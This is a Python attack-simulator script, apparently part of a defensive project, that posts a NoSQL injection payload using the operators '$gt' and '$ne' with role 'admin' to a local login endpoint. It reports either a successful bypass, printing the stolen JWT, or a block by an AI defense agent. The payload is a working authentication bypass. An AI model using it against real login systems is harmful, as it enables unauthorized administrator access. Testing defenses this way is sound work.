import requests
import sys
import time
import json

# Target Configuration
TARGET_URL = "http://127.0.0.1:8081/users/login"

def print_banner():
    print("\n" + "="*60)
    print(" 🛠️  PROJECT DEFEND ATTACK SIMULATOR - NOSQL INJECTION")
    print("="*60)
    print(f" Target Endpoint : {TARGET_URL}")
    print(" Attack Type     : NoSQL Login Bypass")
    print(" Payload         : {'role': 'admin', 'email': {'$gt': ''}}")
    print("="*60 + "\n")

def run_nosql_attack():
    print_banner()
    print("[*] Attempting to bypass login using NoSQL Injection...")
    
    # MALICIOUS PAYLOAD: Targeting the 'admin' role while using NoSQL operators
    payload = {
        "role": "admin",
        "email": {"$gt": ""},
        "password": {"$ne": None}
    }
    
    try:
        response = requests.post(TARGET_URL, json=payload, timeout=5)
        
        if response.status_code == 202:
            data = response.json()
            print("\n🔓 [HACK SUCCESS] Login Bypass Successful!")
            print(f"🔓 Logged in as: {data.get('user', {}).get('name', 'Unknown')}")
            print(f"🔓 User Role   : {data.get('user', {}).get('role', 'Unknown')}")
            print(f"🔓 JWT Token   : {data.get('token')}")
            print("\n[VERDICT] The server is VULNERABLE. The hacker has gained Admin access!")
            
        elif response.status_code == 403:
            print("\n🛑 [ATTACK BLOCKED] AI DEFENSE AGENT DETECTED THE THREAT!")
            try:
                error_data = response.json()
                print(f"🛡️  Server Response: {error_data.get('error', 'Access Denied')}")
            except:
                print(f"🛡️  Server Response: {response.text}")
            print("\n[VERDICT] The AI Agent identified the malicious NoSQL operator and stopped the bypass.")
            
        else:
            print(f"\n[-] Received unexpected status code: {response.status_code}")
            print(f"[-] Response: {response.text}")

    except Exception as e:
        print(f"\n❌ [ERROR] Could not connect to the server: {e}")

if __name__ == "__main__":
    try:
        run_nosql_attack()
    except KeyboardInterrupt:
        print("\n[!] Attack cancelled.")
    print("\n" + "="*60)
    input("Press Enter to exit...")
